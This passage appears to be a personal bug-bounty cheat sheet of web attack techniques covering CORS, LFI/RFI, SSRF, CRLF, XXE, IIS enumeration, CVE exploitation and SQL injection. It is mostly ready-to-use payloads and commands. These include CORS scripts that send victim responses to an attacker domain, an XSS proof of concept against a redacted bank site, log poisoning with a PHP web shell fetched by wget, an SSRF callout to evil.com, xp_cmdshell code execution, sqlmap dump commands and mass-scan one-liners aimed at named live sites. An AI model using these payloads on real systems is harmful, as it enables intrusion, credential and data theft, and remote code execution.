  2) Then cat hosts1 | sort -u | tee -a hosts2 and then cat hosts2 | httpx | tee -a hosts .
   3) Navigate through terminal where hosts file is located  echo "/" > paths
   4) Then type meg -v
  5) After the completion of process type gf cors.
  6) All the urls with Access-Control-Allow will be displayed.
  
  
   tools need for 2 
   https://github.com/tomnomnom/meg
   https://github.com/tomnomnom/gf
   https://github.com/projectdiscovery/subfinder
  
   https://github.com/tomnomnom/assetfinder
   https://github.com/Findomain/Findomain
   https://github.com/projectdiscovery/httpx
  
  
  TIP
  ALWYS CHECK IF THE WEBSITES ALWSY TRUST ANT SUBDOMAIN THROW AT IT, IF YES , FIND THE XSS ON THE SUBDOMAIN  or any subdomain it trustes    //CHECK FOR GUIDANCE AT https://danielantonsen.com/abusing-cors-improper-origin-validation/
  
  examples
  function cors() {  
var xhttp = new XMLHttpRequest();  
xhttp.onreadystatechange = function() {    
    if (this.status == 200) {    
    alert(this.responseText);     
    document.getElementById("demo").innerHTML = this.responseText;    
    }  
};  
xhttp.open("GET", "https://www.redacted.com/api/return", true);  
xhttp.withCredentials = true;  
xhttp.send();
}
cors();
   
   POCS
    https://banques.redacted.com/choice-quiz?form_banque="><script>function%20cors(){var%20xhttp=new%20XMLHttpRequest();xhttp.onreadystatechange=function(){if(this.status==200) alert(this.responseText);document.getElementById("demo").innerHTML=this.responseText}};xhttp.open("GET","https://www.redacted.com/api/return",true);xhttp.withCredentials=true;xhttp.send()}cors();</script>&form_cartes=73&iframestat=1
  
  
  
  tip
  💡
  A server may (at times) respond with CORS headers ONLY if the Origin header is set in the request. If this Origin header is not there already then try adding it.
  
  GET
  var xhr = new XMLHttpRequest(); 
xhr.onload = reqListener; 
xhr.open('GET','https://target.example.com/endpoint/',true); 
xhr.withCredentials = true;
xhr.send();

// leak json response to attacker domain
function reqListener() {
    location='https://attackerdomain.com/?response='+this.responseText; 
};
  POST
  var postdata = "fname=Henry&lname=Ford"

var xhr = new XMLHttpRequest(); 
xhr.onload = reqListener; 
xhr.open("POST", 'https://target.example.com/endpoint/', true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.withCredentials = true;
xhr.send(postdata);

// leak json response to attacker domain
function reqListener() {
    location='https://attackerdomain.com/?response='+this.responseText; 
};
  
  many servers programmatically generate the Access-Control-Allow-Origin header based on the user-supplied Origin value. This is the single most common CORS vulnerability. If you see a HTTP response with any Access-Control-* headers but no origins declared, this is a strong indication that the server will generate the header based on your input. Other servers will only send CORS headers if they receive a request containing the Origin header, making associated vulnerabilities extremely easy to miss.



 BLACK BOX CORS TESTING 
  TEST THE APPLICTAION FOR DYNAMIC GENERATION
  	does it reflect the user -supplied ACAO header  If it is set to a wildcard (*) or is too permissive, it can indicate a vulnerability        // origin :https://attacker.com    0R  *
  	does it only validate on the start/ end of a specific string ? .  the results from wrong regex expresion   // origin :https://attacker.com.smart.com    OR  https://smart.attacker.com
  	does it allow the null origin        ///    origin: null
  	does it restrict the protocol
  	does it allow credential when option 2 ( does it only validate on the start/ end of a specific string ) is true   // no browers accept this as true using only wild card * it invalidate it 
  //	When responding to a credentialed request,  server must specify a domain, and cannot use wild carding
   
  

Access-Control-Allow-Methods: This header defines which HTTP methods (e.g., GET, POST) are allowed in cross-origin requests.
Access-Control-Allow-Headers: This header specifies the HTTP headers that can be used in the actual request.
Access-Control-Allow-Credentials: If this is set to true, it means that the website allows credentials (e.g., cookies) to be included in cross-origin requests. This should be used cautiously.


   the following table summarizes the exploitability based on the CORS configuration:
   
   acces control-Allow-Origin” value          Access-Control-Allow-Credentials” value                 Exploitable
   https://attacker.com                                true                                                     yes
     null                                                true                                                  yes
     *                                                  true                                                    no
     
     
    THE  BASIC TECHNIQUE  WHEN ACCES-CONTROL-ALLOW- CREDENTIAL IS SET TO TRUE
     var req = new XMLHttpRequest();
req.onload = reqListener;
req.open(“get”,”https://vulnerable.domain/api/private-data”,true);
req.withCredentials = true;
req.send();
function reqListener() {
 location=”//attacker.domain/log?response=”+this.responseText;
};
  

 \\ USING CURLS WHEN TESTIN FOR CORS //
  curl -X GET https://example.com
  
  curl -X GET -I https://example.com
  curl -X GET -H "Origin: https://otherdomain.com" https://example.com
  
  curl -X GET -I -H "Origin: https://otherdomain.com" https://example.com
   curl -X POST -I https://example.com

  curl -X POST -I https://example.com
  curl -X POST -I -H "Origin: https://otherdomain.com" https://example.com
  
  curl -X PUT -I https://example.com
  curl -X PUT -I -H "Origin: https://otherdomain.com" https://example.com

  curl -X DELETE -I -H "Origin: https://otherdomain.com" htps://example.com
  curl -X DELETE -I https://example.com

  curl -X OPTIONS -I -H "Access-Control-Request-Method: POST" -H "Origin: https://otherdomain.com" https://example.com           //This command tests how the website handles cross-origin 
                                                                                                                                  requests with credentials (e.g., cookies). Replace
                                                                                                                                   "YOUR_SESSION_COOKIE" with a valid session cookie. //

curl https://my.target.com/api/web/user -H "Origin: https://geekboy.ninja" -I 


  
    STEP BY STEP USING THE DEVELOPER BROWERS TOOL
    
    OPEN THE browers and go to the website , go to the developer tool when right click 
    check on the netwrok tab/ console
    
    go to different website and copy its url , open the developer tools and 
    type a command to make a request to the first website (the testing websites)
    OBSERVE THE RESULT
    
   After you send the request, check what happens in the developer tools. If everything is set up correctly (good CORS), the request might be blocked, and you'll see an error message. 
 
   But if the request goes through without any problems (bad CORS), 

    always Repeat and Experiment:

  Try different websites and different types of requests (GET, PUT, PATCH, POST, DELETE,OPTION AND HEAD ).
  

    Javascript Script For Testing Cors
    
    // Replace these with your target website and the origin you want to test.
const targetURL = 'https://example.com';
const customOrigin = 'https://attacker.com';

// Create a fetch request with a custom origin header.
fetch(targetURL, {
  method: 'GET', // You can use different methods like POST, PUT, DELETE, etc.
  headers: {
    'Origin': customOrigin,
  },
})
  .then(response => {
    console.log('Response status:', response.status);
    // Check if the response headers indicate that the request was allowed.
    if (response.headers.get('Access-Control-Allow-Origin') === customOrigin) {
      console.log('CORS is potentially misconfigured.');
    } else {
      console.log('CORS is properly configured.');
    }
  })
  .catch(error => {
    console.error('Error:', error);
  });
  
  CORS Bypass
Origin:null
Origin:attacker.com
Origin:attacker.target.com
Origin:attackertarget.com
Origin:sub.attackertarget.com
Origin:attacker.com and then change the method Get to post/Post to Get
Origin:sub.attacker target.com
Origin:sub.attacker%target.com
Origin:attacker.com/target.com





  
    LOCAL/REMOTE FILE INCLUSION (LFI/RFI)      LOCAL/REMOTE FILE INCLUSION (LFI/RFI)                LOCAL/REMOTE FILE INCLUSION (LFI/RFI)
    http://example.com/index.php?log_file=/var/log/apache2/access.log&cmd=id
    
    You can test for this issues in two ways:

Manually reading the javascript code and understanding it. Specifically checking for GET parameters used within the application and appended to any URL Path.
Inspecting the XHR Requests in the browser console and checking for some user controllable input in the path of any request made by the application.
If you use the second option you will miss a lot of bugs because you depends of knowing what parameters are susceptible to be vulnerable. Maybe some parameter is not used in the UI but the javascript is using it.

An alternative approach is to combine both methods. You can check for parameter reflection in XHR Requests and then understand how the javascript is handling that parameter.





    
    1) Verify the LFI vulnerability by grabbing the passwd, hosts, etc, files       /index.php?page=/etc/passwd
   2) Verify that you have access to the access log by including it through LFI       /index.php?page=/var/log/apache2/access.log
   3) Use netcat or something similar to send the mailicious request    
      ncat 192.168.56.101 80
    Then we need to enter the following

   GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1
    Host: (your_ip)
    Connection: close
    4) Verify code execution by testing some simple command like id, whoami, etc     	 /index.php?page=/var/log/apache2/access.log&cmd=id

   5) Use either wget or write a upload form to the server to get the browser shell onto the server    	 &cmd=wget http://somedomain.com/shellfile.php
  6) Visit the browser shell to verify success.    
  
  
  //////////
  Open any picture in another window for example: "https://peering.google.com/static/images/couch-ipad.png".
Add one of this value at the end of the link: ("../../../../../../../etc/passwd") OR ("../../../../../../../proc/self/cmdline") OR ("../../../../../../../proc/self/stat") OR ("../../../../../../../proc/self/status").

   ///////
   found interesting param using gf tool --> send request to Intruder --> using LFI-Jhaddix wordlist -->Got LFI 
Payload used: %2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
  
  
     //////////
     
     focus on spcific parameter like image=,file= , filename=, documement==test.pdf
     use wapplazer to check what the application is running on 
     you could goggle check the  ---      site:url inurl:?filename=ext:aspx  and try to travess on path using the web.config   NOTE: ext:aspx  this depends on what the application is running  
     always use the burpsuite to check for lfi
       check for download section
      check for file extension and then assum if the file is ending with file .php or .jpeg    // check  for     ..//index.php  and  ../index.jpeg and so on
      ffuf -u "https://www.harshithexams.co.in/download.php?filename=../FUZZ.php" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -ac           this is example
      
      gau domain.tld | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
  
    
    ///////////// RFI
    check if you could use the login page to redirect users to an external URL that is external to the application in burp
    example, in the GET request of the page, change it to yours external url
    GET/smartkelvin/index.php?page=(yoururl)/page http/1.1
    
    /etc/shadow /// also use this too
    Payload: GET /assets/css///////../../../../../../../../etc/passwd  
    
    cat hosts | httpx -nc -t 250 -p 80,443,8080,8443,4443,8888 -path "///////../../../etc/passwd" -mr "root:x" | anew lfi-httpx.txt
    
    TRAVERSAL SEQUENCES STRIPPED NON-RECURSIVELY
    http://example.com/index.php?page=../../../etc/passwd
    http://example.com/index.php?page=....//....//....//etc/passwd
    http://example.com/index.php?page=....\/....\/....\/etc/passwd
    http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
    
    
    http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
    http://example.com/index.php?page=a/../../../../../../../../../etc/passwd..\.\.\.\.\.\.\.\.\.\.\[ADD MORE]\.\.
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.

#With the next options, by trial and error, you have to discover how many "../" are needed to delete the appended string but not "/etc/passwd" (near 2027)

http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd

    FILTER BYPASS TRICK 
    http://example.com/index.php?page=....//....//etc/passwd
     http://example.com/index.php?page=..///////..////..//////etc/passwd
     http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
    Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
    http://example.com/index.php?page=PhP://filter
    
    
    httpx -l url.txt -path "///////../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:'
    
    
    
    
    
    Here’s list of top 25 parameters that could be vulnerable to local file inclusion (LFI)
    ?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}


















    SSRF         SSRF        SSRF      SSRF      SSRF
        tools
    # https://github.com/tarunkant/Gopherus
gopherus --exploit [PLATFORM]
# https://github.com/daeken/SSRFTest
# https://github.com/jmdx/TLS-poison/
# https://github.com/m4ll0k/Bug-Bounty-Toolz
# https://github.com/cujanovic/SSRF-Testing
# https://github.com/bcoles/ssrf_proxy
https://github.com/blackhatethicalhacking/SSRFPwned

allows check this x-mind while testing for   ssrf      https://xmind.app/m/eJm7bd/#


gau domain.com | python3 ssrf.py collab.listener.com

# https://github.com/micha3lb3n/SSRFire
./ssrfire.sh -d domain.com -s yourserver.com -f /path/to/copied_raw_urls.txt

# SSRF Redirect Payload generator
# https://tools.intigriti.io/redirector/    

     TOP PAYLOADs
     // Basic SSRF Payloads:
Use these payloads to initiate basic SSRF testing by attempting to fetch internal resources.
http://localhost
http://127.0.0.1
http://internal-server
http://metadata.google.internal/computeMetadata/v1/
    
    
 // File Retrieval Payloads:
Test SSRF by attempting to read files from the server.
file:///etc/passwd
file:///etc/hostname
file:///etc/hosts
   http://example.com/ssrf.php?url=file:///etc/passwd
http://example.com/ssrf.php?url=file:///C:/Windows/win.ini
      dict
     http://example.com/ssrf.php?dict://evil.com:1337/
    evil.com:$ nc -lvp 1337



    



   
    𝗖𝗥𝗟𝗙    𝗖𝗥𝗟𝗙  𝗖𝗥𝗟𝗙       𝗖𝗥𝗟𝗙       𝗖𝗥𝗟𝗙           𝗖𝗥𝗟𝗙                         𝗖𝗥𝗟𝗙                            𝗖𝗥𝗟𝗙


  # CR/LF (Carriage Return/Line Feed) Injection     
https://medium.com/cyberverse/crlf-injection-playbook-472c67f1cb46
https://www.praetorian.com/blog/using-crlf-injection-to-bypass-akamai-web-app-firewall/

CR/LF (Carriage Return/Line Feed) injection is a type of security vulnerability. CR/LF refers to a sequence of two ASCII control characters: Carriage Return (CR, ASCII code 13) and Line Feed (LF, ASCII code 10). These characters are used in text files to signify the end of a line and control the positioning of the cursor or print head when displaying or printing text. CR/LF injection vulnerabilities occur when attackers insert CR/LF characters into input fields, file extensions or file uploads to manipulate application behavior. This can lead to exploits such as altering headers, injecting malicious code, or manipulating file content.
                 
                 
## Here are some tips for finding CRLF (Carriage Return Line Feed) vulnerability:

1️⃣: Look for places where user input is reflected in the HTTP response header. CRLF vulnerabilities often arise when user input is injected into the header without being properly sanitized.

2️⃣: Try injecting CRLF characters into user input fields to see if they are reflected in the header. For example, you might try inputting a string like "foo%0D%0Abar" into a search field and see if "foo" and "bar" appear as separate lines in the header.

3️⃣: Use a tool like Burp Suite to intercept and modify HTTP requests. This can make it easier to inject CRLF characters and analyze the resulting header.

4️⃣: Pay attention to the content of the header and how it changes based on your input. Look for patterns or anomalies that might indicate a CRLF vulnerability.

5️⃣: Keep in mind that CRLF vulnerabilities can be used to perform a variety of attacks, including HTTP response splitting, header injection, and cache poisoning.  
 
If you suspect that a CRLF vulnerability is present, be sure to thoroughly test and understand its potential impact.
                 
     ## crlf to path travesly   
#https://infosecwriteups.com/understanding-crlf-injection-7b042fd5fb22
http://vulnerable-website.com//www.google.com/%2f%2e%2e%0d%0aheader:header>
 
#TIP
  𝗖𝗥𝗟𝗙 𝗜𝗻𝗷𝗲𝗰𝘁𝗶𝗼𝗻 𝗕𝘆𝗽𝗮𝘀𝘀 𝘂𝘀𝗶𝗻𝗴 𝗚𝗕𝗞 𝗘𝗻𝗰𝗼𝗱𝗶𝗻𝗴
GET /Cybertix    ==>  404 Not Found
GET /%0D%0A%20Set-Cookie:cybertix=1  ==> 400 Bad Request
GET /%E5%98%8D%E5%98%8Set-Cookie:cybertix-1 ==> 𝟮𝟬𝟬 𝗢𝗞


   
      tip
   CRLF Injection


Where to find
It can be found anywhere, always check the request and response. Try to search for parameters that lead to redirects, you can see the response is (301, 302, 303, 307, 308).

How to exploit
Basic payload
https://example.com/?lang=en%0D%0ALocation:%20https://evil.com/
The response is

HTTP/1.1 200 OK
Content-Type: text/html
Date: Mon, 09 May 2016 14:47:29 GMT
Set-Cookie: language=en
Location: https://evil.com/
Double encode
https://example.com/?lang=en%250D%250ALocation:%20https://evil.com/
Bypass unicode
https://example.com/?lang=en%E5%98%8A%E5%98%8DLocation:%20https://evil.com/









XXE/ XML VULNERABILITIES                          XXE/ XML VULNERABILITIES                             XXE/ XML VULNERABILITIES




https://blog.detectify.com/best-practices/how-we-got-read-access-on-googles-production-servers/


Simple template 


<?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "file:///etc/passwd" > ] > <foo>&xxe;</foo> See if it's possible to add


The following is a basic test:
<!--?xml version="1.0" ?--> <!DOCTYPE replace [<!ENTITY example "Doe"> ]>  <userInfo>   <firstName>Juan</firstName>   <lastName>&example;</lastName>  </userInfo> The following is a classic XXE:
<?xml version="1.0"?> <!DOCTYPE data [ <!ELEMENT data (#ANY)> <!ENTITY file SYSTEM "file:///etc/passwd"> ]> <data>&file;</data> <?xml version="1.0" encoding="ISO-8859-1"?>   <!DOCTYPE foo [   <!ELEMENT foo ANY >   <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo> <?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [   <!ELEMENT foo ANY >   <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo> This is classic XXE Base64 encoded:
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init;
]><foo/>




https:/​/​www.​davidsopas.
com/​wikiloc-​xxe-​vulnerability/





      CVES      CVES     CVES      CVES 
      Xss and nuclei template for it.

 CVE-2019-14974 , link for template 
github.com/conan-sudo/CVE…

How to use
Find so many subdomains and run the nuclei templates
https://twitter.com/hasansheet/status/1798752531205812373?t=Gjeo0ly2steQVUo1TrI6ew&s=19 



cve-2024-24919                             https://medium.com/@jeetpal2007/how-to-exploit-cve-2024-24919-path-traversal-5493c50d2581
Hunter: /product.name=”Check Point SSL Network Extender”
FOFA: title=”Check Point SSL Network Extender” 
SHODAN: http.title=”Check Point SSL Network Extender”




CVE-2024-34470 on 
@fofabot
 
Many vulnerable brazilian servers 🇧🇷

GET   /mailinspector/public/loader.php?path=../../../../../../../etc/passwd

Query⚙️title=="..:: HSC MailInspector ::.."

Link🔗https://en.fofa.info/result?qbase64=dGl0bGU9PSIuLjo6IEhTQyBNYWlsSW5zcGVjdG9yIDo6Li4i&page=1&page_size=10


   CVE-2024-4040
   https://github.com/rbih-boulanouar/CVE-2024-4040
   A server side template injection vulnerability in CrushFTP in all versions before 10.7.1 and 11.1.0 on all platforms allows unauthenticated remote attackers to read files from the filesystem outside of the VFS Sandbox, bypass authentication to gain administrative access, and perform remote code execution on the server.

python exploit.py -u https://example.com -p /etc/passwd



CVE Discovery at Scale
   github dorks for CVES
   https://medium.com/@dub-flow/the-easiest-way-to-find-cves-at-the-moment-github-dorks-29d18b0c6900
   
   PHP XSS:
          /\becho\b.*\$_GET\b/ or /echo\s+\$_REQUEST/
PHP XSS: 
          /^.*\becho\s+\$_GET\b.*$/
PHP XSS (most FP-prone): 
          /^.*\becho\s+\$\b.*$/
PHP SQL Injection:
                  /(SELECT|INSERT|UPDATE|DELETE)\s(.*\$_POST|.*\$_GET|.*\$_REQUEST)/
PHP OS Command Injection: 
               /(exec\(|system\(|shell_exec\(|passthru\()(.*\$_POST|.*\$_GET|.*\$_REQUEST)/
Host Header Injection (Node.js & PHP): 
             req.headers.host path:*pass* and /\$_SERVER\['host'\]|gethostname\(\).*(reset|forgot)/
.NET Host Header Injection: 
                     /(Request\.Headers\["Host"\]|Request\.Host\.Value|HttpContext\.Current\.Request\.Headers\["Host"\]|HttpContext\.Request\.Host\.Value)/ forgot
Host Header Injection generic:
                       host path:**/*forgot*/**
Insecure Deserialization in PHP: 
                    /(unserialize\()(.*\$_POST|.*\$_GET|.*\$_REQUEST)/


# #IIS-VUNERABILITY                              IIS-VUNERABILITY                               IIS-VUNERABILITY
https://docs.google.com/presentation/d/1AA0gX2-SI_9ErTkBhtW0b-5BH70-1B1X/edit?pli=1#slide=id.p46 
#nuclie-template
 https://github.com/projectdiscovery/nuclei-templates/blob/d6636f9169920d3ccefc692bc1a6136e2deb9205/fuzzing/iis-shortname.yaml
        
# #Discovering
#### Shodan 
 http.title:"IIS"
Company dork
Ssl:"Bsides Ahmedabad Inc." http.title:"IIS"

Host dork
Ssl.cert.subject.CN:"bsidesahmedabad.in" http.title:"IIS"

  Tools For Testing
 1) IIS Tilde Enumeration (Burp Extension)
2) Shortscan tool Github
   (to detect short names of files and directories)
3) JetBrains dotPeek
    (to analyze files such as dll file and export the source of that file)
4) visual studio code 
     [for read/review the code/source]

###### #Testing
Sortscan basic usage
shortscan https://url/
Burp Extension IIS Tilde Enumeration
Copy the target url and scan 
**NOTE** 
any valid dir endpoint such as 403,401,301,200 etc… 
scan that endpoint again , not just the url 

  
example
$ shortscan https://bsidesahmedabad.in/
$ shortscan https://bsidesahmedabad.in/admin/
$ shortscan https://bsidesahmedabad.in/test/
FFUF fuzzing
$ ffuf -w iis.txt -u https://bsidesahmedabad.in/FUZZ
$ ffuf -w iis.txt -u https://bsidesahmedabad.in/shortnameFUZZ
Shortname-FUZZ / shortname_FUZZ


Tips to complete the shortname and get a valid Dir/file
https://IIS/
 [+] Identified directories: 
 1
 |_ DS_STO~1
Identified files: 1
|_ DESKTOP~1.ZIP

###### #FFUF
$ ffuf -w iis.txt -u https://IIS/ds_stoFUZZ
$ ffuf -w iis.txt -u https://IIS/desktopFUZZ.zip
$ ffuf -w iis.txt -u https://IIS/desktop-FUZZ.zip
$ ffuf -w iis.txt -u https://IIS/desktop_FUZZ.zip
$ ffuf -w iis.txt -u https://IIS/desktop%20FUZZ.zip

2) Github dorking 
     Path:/ds_sto
3) Chat AI
    GENERATE A long worldlist starting ds_sto

4) Intruder (numbers 0-100000)/Etc….

    
 
 SQL INJECTION        SQL INJECTION          SQL INJECTION            ****check for cypher injection
    
 

 https://medium.com/@amitdutta6026/bypassing-cloudflares-sql-injection-filter-without-origin-ip-discovery-2bb8c97bc5db
 https://medium.com/@daoud_youssef/from-host-header-injection-to-sql-injection-e7c61a61b575 
 https://medium.com/@HX007/subdomain-fuzzing-worth-35k-bounty-daebcb56d9bc
     https://pentestbook.six2dez.com/enumeration/web/sqli
  https://hacktube5.online/sqlmap-tamper-scripts-to-bypass-waf/
  https://medium.com/@bug4y0u/how-i-got-4-sqli-vulnerabilities-at-one-target-manually-using-the-repeater-tab-ed4eb1f84147 
  https://github.com/malvads/sqlmc
  https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/
  https://portswigger.net/web-security/sql-injection/cheat-sheet
  
   
   check this tool https://github.com/danialhalo/SqliSniper
   
   
   
   
   tip on error base sqli

remenmber that   developer block or filter ' "   # ; ?  these ..  check  error_base_payload   and see alot of payload to use..  if there is  any error try sqli with ghauri and sqlmap and manually in burp to confirm more..
 

 
    ‘/*!Union/*AmitTheNoob*/*/ select 1,2,3,table_name,5,6 from information_schema.tables where table_schema=database().
 
https://github.com/HernanRodriguez1/SQLi_Sleeps
 https://www.codelivly.com/sql-injection-101-understanding-the-basics-of-sql-injection-attacks/

#TIP 
 payload 
 admin’ or ‘1’=’1'#
-10'XOR(if(now()=sysdate(),sleep(20),0))XOR'Z
XOR(if(now()=sysdate(),sleep(9),0))XOR\"Z
  
  #TIP
  # Time-Based Blind SQL Injection in Oracle
  'and 1=DBMS_PIPE.RECEIVE_MESSAGE(1,10)--   

 #using-Ghuari-tool
 ghauri -r a.txt - dbs - batch
 ghauri -r a.txt - dbs -D xxxxxlive -T admin - columns
 ghauri -r a.txt - dbs -D xxxxxlive -T admin - dump - batch


  that's a fancy SQLi payload. Working against almost everything.
/?query="OR 1=1;--"&val1=ZGlkbnQgZXZlbiByZWFk&val2=aHR0cHM6Ly95b3V0dS5iZS9kUXc0dzlXZ1hjUQ%3D%3D&SLEEP(420)
          
#tip
try testing for SQLi Authentication Bypass 
username:'--'/"--"
password:'--'/"--"

admin’ OR 1=1- -‘


  #TIP 
 If you come across a domain that uses Typo3 CMS, be sure to check its parameters. Old version Typo3 CMSs may still earn you rewards.
Payload ;
-1+OR+3 AND if(now()=sysdate(),SLEEP(9),0)-- wXyW2 AND if(now()=sysdate(),SLEEP(9),0)-- wXyW1=6 +AND+000762=000762

#tip
  *configure sqlmap to use this prefix and suffix:*
    --prefix="' " --suffix=' -- a'
      ...&param=r -p param --prefix="cana'||" --suffix="||'y.bluebird" --tamper space2comment --level=3 --risk=2 --string "select distinct object from ucon_p" --code=500 --dbms PostgreSQL --skip-urlencode --no-escape --no-cast --banner --technique=B

   #tip
   The target has an admin login page where certain methods are allowed. I found the API endpoint for the admin login and sent the same payload. Success.  
   
POST /admin/login ==> 405 
POST /api/v01/admin/login ==> 200 OK + Blind SQLi 

   tip
 check if you could test all the parameter with =  25%25

#tip
 escalating-time-based-sql-injection-to-rce-using-xp-cmdshell-1b724b8e3c90
     https://medium.com/@harrmahar/escalating-time-based-sql-injection-to-rce-using-xp-cmdshell-1b724b8e3c90
     website using  Microsoft SQL Server 
     EXEC xp_cmdshell 'ping 165.1.2.123';                       vps 
     
  https://redacted.com/download/123/123 EXEC xp_cmdshell 'ping%20165.1.2.123';--       
  https://redacted.com/download/123/123%20EXEC%20xp_cmdshell%20'ping%20165.1.2.123'%3b--         urldecoded
  
  tcpdump -i eth0 -icmp
  
  
  #tip
  If you're able to find a JSON POST-based potential SQL injection (SQLi), remember to execute the SQLMAP query with -u and --data using JSON input. I've found more success using this method in SQLMap than when using a request file.
  
  #tip
    Based on the information gathered from the Nuclei scan, which revealed that the application uses PHP running on Apache, I focused on sending MySQL Sleep payloads
    
#TIP
    1. sqlmap -u http://target.com/registration --dbs --forms --crawl=2
2. it will crawl all the links having input field
3. select the parameter you want to test
 
 tip
 Always try the "\" character in login entries. It can trigger an SQL.

curl -d 'username=1\&password=1\' -X POST https :// login(.)domain(.)com
 
 for email
 "' OR 1=1 -- '"@example.com
"mail'); DROP TABLE users;--"@example.com
 
 waybackurls http://testphp.vulnweb.com | gf sqli | tee -a sqli.txt ; wait ; sqlmap -m sqli.txt --batch --random-agent --level 1
 
 waybackurls http://testphp.vulnweb.com | grep -E '\bhttps?://\S+?=\S+' | grep -E '\.php|\.asp' | sort -u | sed 's/\(=[^&]*\)/=/g' | tee urls.txt | sort -u -o urls.txt
 
 cat urls.txt | sed 's/=/=(CASE%20WHEN%20(888=888)%20THEN%20SLEEP(5)%20ELSE%20888%20END)/g' | xargs -I{} bash -c 'echo -e "\ntarget : {}\n" && time curl "'{}'"'
 
#tip
SQL Injection in MS Access with backslash escaped 
SELECT * FROM Users WHERE Username = 'a\' OR \'a\'=\'a' AND Password = 'a\' OR \'a\'=\'a'
SELECT * FROM Users WHERE Username = 'a\' OR 5=10\'2' AND Password = 'a\' OR 5=10\'2

#tip
Sql injection 
 https://hackerone.com/reports/531051 
AlwaYS attempts to mount XXE (XML External Entity) attacks on the file upload form . AND CHECK If XML encoded single quote caused a database error, then try SQli injection 



#tip
Remember,  when ' is filtered out, then CHAR(27) is used  nd try also inserting it on every url parameter  and also try (‘ or 1=2 — )  incase there is firewall blocking  '  or 1=1 -- 
' UNION SELECT CONCAT(name, " ",
ssn) FROM ssn LIMIT 1 OFFSET 1-- -,

Selecting only one table

#tip
Sleep payload when testing 

' or sleep(15) and 1=1#
' or sleep(15)#
' union select sleep(15),null#

#Tip  tip tip
In a comment or picture that has an id, try create an imagery id and watch the response,  then try sql injection by   t inserting 123456789 OR 1=1 into the  address bar as the pic_id parameter. try the emoji in  ant  input field below give 😯. somtimes develper dont validate emoji

UNION SELECT 1,2,username,password FROM users WHERE username='admin'
 
 #tip
 users=any@mail.com&pass=admin
--> 1 sec

user=any@mail.com'XOR(SELECT(0)FROM(SELECT(SLEEP(10)))a)XOR'Z
--> 30s

user=any@mail.com'XOR(SELECT(0)FROM(SELECT(SLEEP(20)))a)XOR'Z
--> 30s
 
     TIP
     Sometimes bypassing SQL can be a problem, you can try this way
payload ;

8%20or%207250%3d0725

sqlmap ;
sqlmap -u 'h t t p :// domain[.]com / anyfile.asp?id_test=8%20or%207250%3d07250' --dbs --random-agent ignore=500 - -code=200 -T tablename --columns -- no-cast

        sqlmap -u "https://www.cadiak.com.la/reporttype.php?id=2" --batch -D cbl22 --tables --threads=5 --force-ssl
   
   
   tip
        Post sql) Put ' in search box it reflect sql error in response after that intercept request in burpsuite and in search param put * so sqlmap will automatic detect param endpoint to test  and copy all request and save it in file and use -r flag in sqlmap
 
 
 
#tip 
 echo https://www.recreation.gov | waybackurls | grep "?" | uro | httpx -silent > param.txt
cat subdomains.txt | waybackurls | grep "?" | uro | httpx -silent > param.txt
sqlmap -m param.txt --batch --random-agent --level 1 | tee sqlmap.txt
sqlmap -u https://my.easyname.at/en/login --dbs --forms --crawl=2


  #using-sqlmap
  https://cybr.com/ethical-hacking-archives/sqlmap-cheat-sheets-to-help-you-find-sql-injections/
  --tamper
  --tamper="random,appendnullbyte,between,base64encode"     //     This would instruct sqlmap to use all of the scripts separated by commas.
  --tamper="between,randomcase"    
    --list-tampers           list all the temper
    
    
Level 2    look for  HTTP Cookie headers for SQL injection vulnerability
sqlmap -u 'http://localhost:8440/" --level=2
sqlmap -u 'http://localhost:8440/" --level=2 --cookie="PHPSESSID=..." --param-exclude="PHPSESSID"
sqlmap -u 'http://localhost:8440/" --level=2 --cookie="PHPSESSID=..." --skip="cookies"
sqlmap -u 'http://localhost:8440/" --level=2 --cookie="PHPSESSID=..." -p "id"





   tip  
   hunting in smart way
   

Step 1: I used google dork to fetch all the login pages → site:redacted.com inurl:login

Step 2: Make a list of SQL payloads, hit on all the login pages with Intruder.

Step 3: Check for SQL Query in error/response.

Step 4: If you successfully get SQL error → Run SQL map

Step 5: Get the big FAT Bounty !!!!




   #ONE-LINER
   SQLI ONE LINER:-     SQLI ONE LINER:-     SQLI ONE LINER:-
   
   sqlmap -u 'h t t p :// domain[.]com / anyfile.asp?id_test=8%20or%207250%3d07250' --dbs --random-agent ignore=500 - -code=200 -T tablename --columns -- no-cast
   
   
cat target.com | waybackurls | grep "?" | uro | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt

subfinder -dL domains.txt | dnsx | waybackurls | uro | grep "?" | head -20 | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt

